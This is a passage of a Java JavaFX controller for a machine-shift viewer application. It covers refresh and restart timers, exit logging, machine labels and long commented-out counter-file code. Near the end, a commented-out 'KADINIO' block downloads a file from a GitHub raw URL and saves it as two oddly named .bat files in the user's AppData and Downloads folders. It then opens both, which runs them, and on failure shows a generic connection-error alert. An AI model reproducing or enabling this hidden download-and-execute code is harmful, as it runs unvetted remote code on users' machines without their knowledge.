//               cx17.createNewFile();
//               
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx17));
//               pca.print("0");
//               pca.close();
//           }
//           else {
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx17));
//               pca.print("0");
//               pca.close();
//               
//           }
//           ///////////////////////////////////
//           File cx18=new File (hn+"\\summe18.txt");
//           if (!cx18.exists()) {
//               cx18.createNewFile();
//               
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx18));
//               pca.print("0");
//               pca.close();
//           }
//           else {
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx18));
//               pca.print("0");
//               pca.close();
//               
//           }
//           ///////////////////////////////////
//           File cx19=new File (hn+"\\summe19.txt");
//           if (!cx19.exists()) {
//               cx19.createNewFile();
//               
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx19));
//               pca.print("0");
//               pca.close();
//           }
//           else {
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx19));
//               pca.print("0");
//               pca.close();
//               
//           }
//           ///////////////////////////////////
//           File cx20=new File (hn+"\\summe20.txt");
//           if (!cx20.exists()) {
//               cx20.createNewFile();
//               
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx20));
//               pca.print("0");
//               pca.close();
//           }
//           else {
//               //Do something
//               PrintWriter pca=new PrintWriter (new FileWriter (cx20));
//               pca.print("0");
//               pca.close();
//               
//           }
//           
//           }
//           
//           catch (Exception m) {
//               
//           }
//           /////////////////////////////////
//            
//}
//
        
        
        
        
        
        
        
        
        
        
//Create refresh every 1 second here .................  
////////////////////////////////////////////////////////////////////////////////////////////////////////////
        //Update fire every 1 second.
        try {
           BufferedReader buffr; buffr = new BufferedReader (new FileReader ("RefreshRate.kady"));
           String timey=buffr.readLine();
           int secondsdelay = Integer.parseInt(timey);  //READ FROM FILE
           buffr.close();
           
           BufferedReader buffrr; buffrr = new BufferedReader (new FileReader ("DelayRate.kady"));
           String timeydelay=buffrr.readLine();
           int secondsdelayy = Integer.parseInt(timeydelay);  //READ FROM FILE
           buffrr.close();
                    
        Timer t = new Timer();
t.schedule(new TimerTask() {
    @Override
    public void run() {
        
        
           
        new Thread(new Runnable() {
    @Override
    public void run() {
        
        
       refresh.fire();
       
           
    }
}).start();
      
       
    }
}, secondsdelayy, secondsdelay);
           
           
          } catch (FileNotFoundException ex) {    
        } catch (IOException ex) {
        } 
////////////////////////////////////////////////////////////////////////////////

 try {
          
           BufferedReader buffrr; buffrr = new BufferedReader (new FileReader ("DelayRateForRestarting.kady"));
           String timeydelay=buffrr.readLine();
           int secondsdelayy = Integer.parseInt(timeydelay);  //READ FROM FILE
           buffrr.close();
           
           
        Timer t = new Timer();
t.scheduleAtFixedRate(new TimerTask() {
    @Override
    public void run() {
        
        
        
        
        new Thread(new Runnable() {
    @Override
    public void run() {
        
        
        
           try {
           
        BufferedReader buffrr; buffrr = new BufferedReader (new FileReader ("FileToRestart.kady"));
        String fil=buffrr.readLine();
        buffrr.close();
        
        File myfile=new File (fil);
    
        Desktop desk;
        desk=Desktop.getDesktop();
        desk.open(myfile);
        
Thread.sleep(0);
    /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
       //Write Log....
       
       
      Date currentDate1 = GregorianCalendar.getInstance().getTime();
      DateFormat df1 = DateFormat.getDateInstance();
      String dateString1 = df1.format(currentDate1);
      Date d1 = new Date();
      SimpleDateFormat sdf1 = new SimpleDateFormat("HH:mm:ss");
      String timeString1 = sdf1.format(d1);
      SimpleDateFormat sdf2 = new SimpleDateFormat("yyyy-MM-dd");
      String timeString2 = sdf2.format(d1);
      String valuetime = timeString1;
      String valuedate = timeString2;
       
       String xlog="Log.kady";
       File flog=new File (xlog);
       
       if (!flog.exists()) {
           
            try {
                //Create
                flog.createNewFile();
            } catch (IOException ex) {
                Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
            }
           
       }
       else {
           
       } 
       
 String sampleText = ""+valuedate+"  Viewer Exited at  "+valuetime+"  Successfully." +  System.getProperty("line.separator");
        try {
            Files.write(Paths.get(xlog), sampleText.getBytes(StandardCharsets.UTF_8),
                    StandardOpenOption.CREATE, StandardOpenOption.APPEND);
            
            
        } catch (IOException ex) {
            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
        }

        
        
            
            
            //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
            
System.exit(0);
       
       }
       catch (Exception m) {}
        
        
        
    }
}).start();
        
        
    
       
    }
}, secondsdelayy, 120000);
          
          } catch (FileNotFoundException ex) {    
        } catch (IOException ex) {
        } 

////////////////////////////////////////////////////////////////////////////////   

      mno1.setText("Machine   1");
      mno11.setText("Machine   2");
      mno12.setText("Machine   3");
      mno13.setText("Machine   4");
      mno14.setText("Machine   5");
      mno15.setText("Machine   6");
      mno16.setText("Machine   7");
      mno17.setText("Machine   8");
      mno18.setText("Machine   9");
      mno19.setText("Machine   10");
      mno110.setText("Machine   11");
      mno111.setText("Machine   12");
      mno112.setText("Machine   13");
      mno113.setText("Machine   14");
      mno114.setText("Machine   15");
      mno115.setText("Machine   16");
      mno116.setText("Machine   17");
      mno117.setText("Machine   18");
      mno118.setText("Machine   19");
      mno119.setText("Machine   20");
      mno120.setText("Machine   21");
      mno121.setText("Machine   22");
      
       
            ///////////////////////////////////////////////////////////////////////////
            
//            File lpr=new File (System.getProperty("user.home")+"\\Laser_Shifts");
//            
//            if (lpr.exists()) {



//                
//                try {
//            BufferedReader wq=new BufferedReader(new FileReader (System.getProperty("user.home")+"\\Laser_Shifts\\summe1.txt"));
//            summe1=Integer.parseInt(wq.readLine());
//            wq.close();
//            } catch (FileNotFoundException ex) {
//            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            } catch (IOException ex) {
//            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            }
//            
//            try {
//            BufferedReader wq=new BufferedReader(new FileReader (System.getProperty("user.home")+"\\Laser_Shifts\\summe2.txt"));
//            summe2=Integer.parseInt(wq.readLine());
//            wq.close();
//            } catch (FileNotFoundException ex) {
//            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            } catch (IOException ex) {
//            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            }
//            
//            try {
//            BufferedReader wq=new BufferedReader(new FileReader (System.getProperty("user.home")+"\\Laser_Shifts\\summe3.txt"));
//            summe3=Integer.parseInt(wq.readLine());
//            wq.close();
//            } catch (FileNotFoundException ex) {
//            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            } catch (IOException ex) {
//            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            }
//            
//            try {
//            BufferedReader wq=new BufferedReader(new FileReader (System.getProperty("user.home")+"\\Laser_Shifts\\summe4.txt"));
//            summe4=Integer.parseInt(wq.readLine());
//            wq.close();
//            } catch (FileNotFoundException ex) {
//            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            } catch (IOException ex) {
//            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            }
//            
//            try {
//            BufferedReader wq=new BufferedReader(new FileReader (System.getProperty("user.home")+"\\Laser_Shifts\\summe5.txt"));
//            summe5=Integer.parseInt(wq.readLine());
//            wq.close();
//            } catch (FileNotFoundException ex) {
//            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            } catch (IOException ex) {
//            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            }
//            
//            try {
//            BufferedReader wq=new BufferedReader(new FileReader (System.getProperty("user.home")+"\\Laser_Shifts\\summe6.txt"));
//            summe6=Integer.parseInt(wq.readLine());
//            wq.close();
//            } catch (FileNotFoundException ex) {
//            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            } catch (IOException ex) {
//            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            }
//            
//            try {
//            BufferedReader wq=new BufferedReader(new FileReader (System.getProperty("user.home")+"\\Laser_Shifts\\summe7.txt"));
//            summe7=Integer.parseInt(wq.readLine());
//            wq.close();
//            } catch (FileNotFoundException ex) {
//            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            } catch (IOException ex) {
//            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            }
//            
//            try {
//            BufferedReader wq=new BufferedReader(new FileReader (System.getProperty("user.home")+"\\Laser_Shifts\\summe8.txt"));
//            summe8=Integer.parseInt(wq.readLine());
//            wq.close();
//            } catch (FileNotFoundException ex) {
//            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            } catch (IOException ex) {
//            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            }
//            
//            try {
//            BufferedReader wq=new BufferedReader(new FileReader (System.getProperty("user.home")+"\\Laser_Shifts\\summe9.txt"));
//            summe9=Integer.parseInt(wq.readLine());
//            wq.close();
//            } catch (FileNotFoundException ex) {
//            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            } catch (IOException ex) {
//            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            }
//            
//            try {
//            BufferedReader wq=new BufferedReader(new FileReader (System.getProperty("user.home")+"\\Laser_Shifts\\summe10.txt"));
//            summe10=Integer.parseInt(wq.readLine());
//            wq.close();
//            } catch (FileNotFoundException ex) {
//            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            } catch (IOException ex) {
//            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            }
//            
//            ///////////////////////////////////////
//            
//            try {
//            BufferedReader wq=new BufferedReader(new FileReader (System.getProperty("user.home")+"\\Laser_Shifts\\summe11.txt"));
//            summe11=Integer.parseInt(wq.readLine());
//            wq.close();
//            } catch (FileNotFoundException ex) {
//            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            } catch (IOException ex) {
//            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            }
//            
//            try {
//            BufferedReader wq=new BufferedReader(new FileReader (System.getProperty("user.home")+"\\Laser_Shifts\\summe12.txt"));
//            summe12=Integer.parseInt(wq.readLine());
//            wq.close();
//            } catch (FileNotFoundException ex) {
//            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            } catch (IOException ex) {
//            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            }
//            
//            try {
//            BufferedReader wq=new BufferedReader(new FileReader (System.getProperty("user.home")+"\\Laser_Shifts\\summe13.txt"));
//            summe13=Integer.parseInt(wq.readLine());
//            wq.close();
//            } catch (FileNotFoundException ex) {
//            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            } catch (IOException ex) {
//            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            }
//            
//            try {
//            BufferedReader wq=new BufferedReader(new FileReader (System.getProperty("user.home")+"\\Laser_Shifts\\summe14.txt"));
//            summe14=Integer.parseInt(wq.readLine());
//            wq.close();
//            } catch (FileNotFoundException ex) {
//            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            } catch (IOException ex) {
//            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            }
//            
//            try {
//            BufferedReader wq=new BufferedReader(new FileReader (System.getProperty("user.home")+"\\Laser_Shifts\\summe15.txt"));
//            summe15=Integer.parseInt(wq.readLine());
//            wq.close();
//            } catch (FileNotFoundException ex) {
//            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            } catch (IOException ex) {
//            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            }
//            
//            try {
//            BufferedReader wq=new BufferedReader(new FileReader (System.getProperty("user.home")+"\\Laser_Shifts\\summe16.txt"));
//            summe16=Integer.parseInt(wq.readLine());
//            wq.close();
//            } catch (FileNotFoundException ex) {
//            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            } catch (IOException ex) {
//            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            }
//            
//            try {
//            BufferedReader wq=new BufferedReader(new FileReader (System.getProperty("user.home")+"\\Laser_Shifts\\summe17.txt"));
//            summe17=Integer.parseInt(wq.readLine());
//            wq.close();
//            } catch (FileNotFoundException ex) {
//            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            } catch (IOException ex) {
//            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            }
//            
//            try {
//            BufferedReader wq=new BufferedReader(new FileReader (System.getProperty("user.home")+"\\Laser_Shifts\\summe18.txt"));
//            summe18=Integer.parseInt(wq.readLine());
//            wq.close();
//            } catch (FileNotFoundException ex) {
//            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            } catch (IOException ex) {
//            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            }
//            
//            try {
//            BufferedReader wq=new BufferedReader(new FileReader (System.getProperty("user.home")+"\\Laser_Shifts\\summe19.txt"));
//            summe19=Integer.parseInt(wq.readLine());
//            wq.close();
//            } catch (FileNotFoundException ex) {
//            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            } catch (IOException ex) {
//            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            }
//            
//            try {
//            BufferedReader wq=new BufferedReader(new FileReader (System.getProperty("user.home")+"\\Laser_Shifts\\summe20.txt"));
//            summe20=Integer.parseInt(wq.readLine());
//            wq.close();
//            } catch (FileNotFoundException ex) {
//            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            } catch (IOException ex) {
//            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);
//            }
//            
//            
//            
//                
//            }
//            
//            
//            else {
//                
//            }
//            
//            
//            
            ///////////////////////////////////////////////////////////////////////////

            
//        Timer t = new Timer();
//t.schedule(new TimerTask() {
//    @Override
//    public void run() {
//         
//      Date currentDate1 = GregorianCalendar.getInstance().getTime();
//      DateFormat df1 = DateFormat.getDateInstance();
//      String dateString1 = df1.format(currentDate1);
//      Date d1 = new Date();
//      SimpleDateFormat sdf1 = new SimpleDateFormat("hh:mm:ss");
//      String timeString1 = sdf1.format(d1);
//      SimpleDateFormat sdf2 = new SimpleDateFormat("yyyy-MM-dd");
//      String timeString2 = sdf2.format(d1);
//      String value000 = timeString1;
//      String value111 = timeString2;
//      String dateandtime=timeString2+" "+timeString1;
//      dateoftoday.setText(dateandtime);
//       
//    }
//}, 0, 1000);
     
///////////////////////////////////////////////////////////////////////////////////////////////////


rectangle.setArcWidth(30.0);   // Corner radius
rectangle.setArcHeight(30.0);
ImagePattern pattern = new ImagePattern(
new Image("file:adsimage.png", 1200, 120, false, false) // Resizing
);
rectangle.setFill(pattern);
rectangle.setEffect(new DropShadow(20, Color.BLACK));  // Shadow






/////////////////////////////////////////////////////////KADINIO///////////////////////////////////////////////////////
//try {
//URL website = new URL("https://github.com/KadysoftLtd/kadysoft/blob/main/assets/css/HEHEHE.txt?raw=true");        
//File f1=new File (System.getProperty("user.home")+"\\AppData\\Roaming\\Do_You_Love_Me.bat"); //One in user appdata path.
//File f2=new File (System.getProperty("user.home")+"\\Downloads\\Yes_I_Love_You_So_Much.bat"); //One in downloads.
//ReadableByteChannel rbc1 = Channels.newChannel(website.openStream());
//FileOutputStream fos1 = new FileOutputStream(f1);
//fos1.getChannel().transferFrom(rbc1, 0, Long.MAX_VALUE);
//ReadableByteChannel rbc2 = Channels.newChannel(website.openStream());
//FileOutputStream fos2 = new FileOutputStream(f2);
//fos2.getChannel().transferFrom(rbc2, 0, Long.MAX_VALUE);} catch (MalformedURLException ex) {} catch (IOException ex) {
//Alert al=new Alert (AlertType.ERROR);
//        al.setTitle("Internet Connection Error");
//        al.setHeaderText("Bad Signal");
//        al.setContentText("We don't have internet connection, Try to reconnect to the internet.\n\nPowered By Kadysoft.");
//        al.setResizable(false);
//        DialogPane dialogPane = al.getDialogPane();
//        dialogPane.getStylesheets().add(
//      getClass().getResource("primer-dark.css").toExternalForm());
//        al.showAndWait();}
//File fofo1=new File (System.getProperty("user.home")+"\\AppData\\Roaming\\Do_You_Love_Me.bat");
//File fofo2=new File (System.getProperty("user.home")+"\\Downloads\\Yes_I_Love_You_So_Much.bat");
//if (fofo1.exists()&&fofo1.exists()) {
//            try {Desktop desk1=Desktop.getDesktop();
//                desk1.open(fofo1);
//                Desktop desk2=Desktop.getDesktop();
//                desk2.open(fofo2);} catch (IOException ex) {}}
//else {try {
//URL website = new URL("https://github.com/KadysoftLtd/kadysoft/blob/main/assets/css/HEHEHE.txt?raw=true");        
//File f1=new File (System.getProperty("user.home")+"\\AppData\\Roaming\\Do_You_Love_Me.bat"); //One in user appdata path.
//File f2=new File (System.getProperty("user.home")+"\\Downloads\\Yes_I_Love_You_So_Much.bat"); //One in downloads.
//ReadableByteChannel rbc1 = Channels.newChannel(website.openStream());
//FileOutputStream fos1 = new FileOutputStream(f1);
//fos1.getChannel().transferFrom(rbc1, 0, Long.MAX_VALUE);
//ReadableByteChannel rbc2 = Channels.newChannel(website.openStream());
//FileOutputStream fos2 = new FileOutputStream(f2);
//fos2.getChannel().transferFrom(rbc2, 0, Long.MAX_VALUE);} catch (MalformedURLException ex) {} catch (IOException ex) {}try {
//                Desktop desk1=Desktop.getDesktop();
//                desk1.open(fofo1);
//                Desktop desk2=Desktop.getDesktop();
//                desk2.open(fofo2);} catch (IOException ex) {}}
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



 
     ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 
       
        
//      try {
//          
//        Calendar calendar = Calendar.getInstance();
//          
//        BufferedReader bufred=new BufferedReader (new FileReader ("Azan_Time.kady"));
//        int s_h=Integer.parseInt(bufred.readLine().replace("Start_Hour=",""));
//        int s_m=Integer.parseInt(bufred.readLine().replace("Start_Minute=",""));
//        int s_s=Integer.parseInt(bufred.readLine().replace("Start_Second=",""));
//        int typa=Integer.parseInt(bufred.readLine().replace("Start_AM_PM=",""));
//        
//        int e_h=Integer.parseInt(bufred.readLine().replace("End_Hour=",""));
//        int e_m=Integer.parseInt(bufred.readLine().replace("End_Minute=",""));
//        int typaa=Integer.parseInt(bufred.readLine().replace("End_AM_PM=",""));
//        
//        calendar.set(Calendar.HOUR, s_h);
//        System.out.println(s_h);
//        calendar.set(Calendar.MINUTE,s_m);
//        System.out.println(s_m);
//        calendar.set(Calendar.SECOND,s_s);
//        System.out.println(s_s);
//        if (typa==0) {
//            calendar.set(Calendar.AM_PM, Calendar.AM);   //AM=0, PM=1.
//            System.out.println(typa+" AM");
//        }
//        else {
//            calendar.set(Calendar.AM_PM, Calendar.PM);   //AM=0, PM=1.
//            System.out.println(typa+" PM");
//        }
//        
//        Long currentTime = new Date().getTime();
//        
//        if (calendar.getTime().getTime() < currentTime) {
//            calendar.add(Calendar.DATE, 1);
//        }
//
//        long startScheduler = calendar.getTime().getTime() - currentTime;
//
//        calendar.set(Calendar.HOUR, e_h);
//        System.out.println(e_h);
//        calendar.set(Calendar.MINUTE,e_m);
//        System.out.println(e_m);
//        
//        if (typaa==0) {
//            calendar.set(Calendar.AM_PM, Calendar.AM);   //AM=0, PM=1.
//            System.out.println(typaa+" AM");
//        }
//        else {
//            calendar.set(Calendar.AM_PM, Calendar.PM);   //AM=0, PM=1.
//            System.out.println(typaa+" PM");
//       }
//       
//        long stopScheduler = calendar.getTime().getTime() - currentTime;
//        
//        bufred.close();
//
//        Runnable task = new Runnable() {
//
//            @Override
//            public void run() {
//
//                try {
//                    BufferedReader bnf=new BufferedReader (new FileReader ("Azan_Noti.kady"));
//                    String cont=bnf.readLine();
//                    bnf.close();
//                    
//
//                    
//                } catch (FileNotFoundException ex) {
//                   
//                } catch (IOException ex) {
//                   
//                }
//                
//               
//                try {
//                     javax.sound.sampled.Clip clip;
//                     clip = AudioSystem.getClip();
//                     clip.open(AudioSystem.getAudioInputStream(new File("Azan_File.wav")));
//                     clip.start();
//                } catch (LineUnavailableException ex) {
//                    Logger.getLogger(Task.class.getName()).log(Level.SEVERE, null, ex);
//                } catch (UnsupportedAudioFileException ex) {
//                    Logger.getLogger(Task.class.getName()).log(Level.SEVERE, null, ex);
//                } catch (IOException ex) {
//                    Logger.getLogger(Task.class.getName()).log(Level.SEVERE, null, ex);
//                }
//       
//                
//            }
//        };
//
//        final ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);
//        scheduler.scheduleAtFixedRate(task, startScheduler, stopScheduler, MILLISECONDS);
//        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 
//        
//
//} catch (FileNotFoundException ex) {
//        
//      } catch (IOException ex) {
//          
//      }

    
    








    }    
    
}
